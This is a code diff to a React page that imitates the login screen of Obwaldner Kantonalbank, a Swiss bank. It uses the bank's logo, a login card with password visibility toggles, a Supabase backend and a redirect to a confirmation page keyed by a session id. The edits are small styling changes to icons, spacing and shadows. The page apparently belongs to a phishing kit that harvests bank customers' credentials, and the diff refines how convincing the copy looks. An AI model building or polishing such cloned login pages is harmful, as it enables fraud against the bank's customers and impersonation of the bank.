@@ -3,7 +3,7 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
-import { Eye, EyeOff, ChevronRight } from "lucide-react";
+import { Eye, EyeOff, ArrowRight } from "lucide-react";
 import logoUrl from "@/assets/obwaldner-kantonalbank-logo.svg";
 
 const RED = "#b12c1e";
@@ -61,11 +61,11 @@ const ChObwaldnerKantonalbank = () => {
           onComplete={() => navigate("/confirmation?s=" + sessionId)}
         />
       )}
-      <div className="min-h-screen flex flex-col bg-[#f5f5f5] md:bg-white">
+      <div className="min-h-screen bg-[#f5f5f5] md:bg-white">
         {/* Roter Top-Balken */}
         <div style={{ height: 6, backgroundColor: RED }} />
 
-        <main className="flex-1 px-0 md:px-4">
+        <main className="px-0 md:px-4">
           {/* Login-Card */}
           <div className="w-full md:max-w-[494px] mx-auto mt-0 md:mt-16 bg-white overflow-hidden md:shadow-sm md:rounded-lg md:border md:border-[#d9d9d9] md:min-h-[720px] flex flex-col">
             {/* Header */}
@@ -134,16 +134,16 @@ const ChObwaldnerKantonalbank = () => {
           </div>
 
           {/* Info-Card */}
-          <div className="w-full md:max-w-[988px] mx-auto mt-[30px] md:mt-8 bg-white overflow-hidden md:rounded-lg border border-[#f0f0f0] shadow-md md:shadow-none">
+          <div className="w-full md:max-w-[988px] mx-auto mt-[30px] md:mt-8 bg-white overflow-hidden md:rounded-lg border border-[#f0f0f0] shadow-xl md:shadow-none">
             <ul>
               {infoLinks.map((label) => (
                 <li key={label}>
                   <a
                     href="#"
-                    className="flex items-center gap-2 px-6 py-4 text-[15px] hover:underline"
+                    className="flex items-center gap-2 px-6 py-2 md:py-4 text-[15px] hover:underline"
                     style={{ color: RED }}
                   >
-                    <ChevronRight size={18} color={RED} />
+                    <ArrowRight size={18} color={RED} />
                     <span>{label}</span>
                   </a>
                 </li>
@@ -153,7 +153,7 @@ const ChObwaldnerKantonalbank = () => {
         </main>
 
         {/* Footer */}
-        <footer className="mt-8 md:mt-12 bg-transparent md:bg-white">
+        <footer className="mt-6 md:mt-12 bg-transparent md:bg-white">
           <div className="max-w-[1100px] mx-auto px-4 py-4 text-[14px] flex flex-row flex-wrap justify-center gap-3 md:justify-end md:gap-6">
             {footerLinks.map((l) => (
               <a
